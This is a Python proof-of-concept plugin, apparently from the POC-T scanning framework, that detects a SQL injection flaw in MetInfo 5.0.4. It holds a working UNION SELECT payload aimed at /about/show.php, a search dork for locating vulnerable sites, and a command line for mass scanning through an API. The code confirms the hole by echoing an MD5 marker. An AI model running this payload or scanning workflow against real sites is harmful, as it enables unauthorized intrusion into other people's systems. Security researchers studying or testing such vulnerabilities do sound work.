#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
MetInfo 5.0.4 Sql injection PoC

Dork
  Powered by MetInfo 5.0.4

Usage
  python POC-T.py -m metinfo-504-sqli --api --dork="Powered by MetInfo 5.0.4"

"""

import requests
from plugin.util import randomMD5
from plugin.urlparser import iterate_path


def poc(url):
    if '://' not in url:
        if ':443' in url:
            url = 'https://' + url
        else:
            url = 'http://' + url
    plain, cipher = randomMD5()
    payload = "/about/show.php?id=-2864 UNION ALL SELECT 25,25,25,25,25,25,25,25,25,25,25,25,25,25,CONCAT(0x717a716b71,IFNULL(CAST(md5(%s) AS CHAR),0x20),0x7171707871),25,25,25,25,25,25,25,25,25,25,25,25--" % plain
    for each in iterate_path(url):
        target = each.rstrip('/') + payload
        try:
            c = requests.get(target, timeout=15).content
            if cipher in c:
                return True
        except Exception:
            break
    return False
